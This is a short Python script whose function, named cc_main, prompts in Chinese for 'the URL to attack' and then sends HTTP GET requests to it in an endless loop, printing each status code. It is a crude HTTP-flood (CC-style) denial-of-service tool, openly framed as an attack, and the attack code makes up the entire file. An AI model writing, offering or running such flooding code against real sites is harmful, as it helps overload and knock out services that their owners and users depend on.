import requests

def cc_main():
    url = input("请输入要攻击的网址:")
    while True:
        response = requests.get(url)
        print(f"状态码: {response.status_code}")